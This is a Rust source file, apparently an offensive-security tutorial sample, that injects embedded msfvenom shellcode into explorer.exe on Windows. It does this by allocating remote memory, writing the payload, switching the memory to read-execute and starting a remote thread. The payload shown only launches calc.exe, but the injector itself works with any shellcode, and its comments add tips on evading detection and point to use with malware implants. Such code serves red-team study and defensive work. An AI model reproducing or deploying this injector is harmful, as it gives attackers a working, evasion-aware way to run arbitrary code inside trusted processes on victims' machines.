// Specify that we want to use the 'windows_sys' crate, which provides Rust bindings to Windows APIs
// It is good practice to further specify the imports for each API type that we want to use to limit clutter in our code.

use std::ptr;
use sysinfo::{PidExt, ProcessExt, System, SystemExt}; // For enumerating processes
use windows_sys::Win32::{
    Foundation::*,
    System::{Diagnostics::Debug::*, Memory::*, Threading::*},
};

// Note the use of `&`, denoting a reference to the shellcode rather than a copy (#JustRustThings)
fn inject_remote(shellcode: &[u8], process_id: u32) {
    //need to specify unsafe to tell Rust we're okay with managing memory directly
    unsafe {
        // Get a handle on the target process in order to interact with it
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
        println!("[+] Got target process handle: {:?}", process_handle);
        // Allocate RW (read-write) memory
        // Opsec tip: RWX memory can easily be detected. Consider making memory RW first, then RX after writing your shellcode like the following
        let allocated_memory = VirtualAllocEx(
            process_handle,           //process handle
            ptr::null_mut(),          // Address to start allocation from. Null means 'anywhere'
            shellcode.len(),          // Size of allocation
            MEM_COMMIT | MEM_RESERVE, // Allocate memory immediately
            PAGE_READWRITE,           // Memory protection flags
        );

        if allocated_memory.is_null() {
            panic!("Failed to allocate memory.");
        }

        println!(
            "[+] Allocated RX memory in remote process at address {:?}",
            allocated_memory
        );

        // Write the payload to the allocated bytes in the remote process
        let mut bytes_written = 0;
        WriteProcessMemory(
            process_handle,
            allocated_memory,
            shellcode.as_ptr() as _, // Get the raw pointer to our shellcode buffer
            shellcode.len(),
            &mut bytes_written,
        );

        println!("[+] Wrote {} bytes to remote process memory", bytes_written);

        // Change the memory protection to RX (read-execute)
        let mut old_protect = 0;

        let mem_protect = VirtualProtectEx(
            process_handle,
            allocated_memory,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if mem_protect == 0 {
            panic!("Failed to change memory protection.");
        }

        // Create a thread at the start of the executable shellcode to run it!
        // We use the 'transmute' function to convert our pointer to a function pointer

        let thread_handle = CreateRemoteThread(
            process_handle,
            ptr::null_mut(),
            0,
            Some(std::mem::transmute(allocated_memory)),
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        );
        println!("[+] Created remote thread!");

        // Wait for our thread to exit to prevent program from closing before the shellcode ends
        // This is especially relevant for long-running shellcode, such as malware implants
        WaitForSingleObject(thread_handle, INFINITE);

        // cleanup

        // Normally Rust is quite good at memory management, but since we are doing unsafe WinAPI stuff we have to clean up after ourselves
        // In this case, we free the memory we allocated earlier and close the thread handle
        // Free the allocated memory
        VirtualFreeEx(
            process_handle,
            allocated_memory,
            0, // Set dwSize to 0 to release the entire region allocated
            MEM_RELEASE,
        );

        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    }
}

// Our main function, required as an entrypoint in Rust
fn main() {
    // Define our shellcode as an array of 'u8' (unsigned 8-bit integers)
    // msfvenom -p windows/x64/exec CMD="C:\windows\system32\calc.exe" EXITFUNC=thread -f rust
    let shellcode: &[u8] = &[
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x43, 0x3a, 0x5c,
        0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33,
        0x32, 0x5c, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];
    // Find the "explorer.exe" process ID by its name using the 'sysinfo' crate
    let s = System::new_all();
    let process_id: u32 = s
        .processes_by_name("explorer")
        .next() // Get only the first result
        .unwrap() // Unwrap the result, panic if an error occurs
        .pid() // Get the process ID
        .as_u32(); // Convert the process ID to an unsigned, 32-bit integer
    println!("[+] Found explorer.exe with PID {}", process_id);
    inject_remote(&shellcode, process_id); // Note the use of `&`, denoting a reference to the shellcode rather than a copy (#JustRustThings)
}
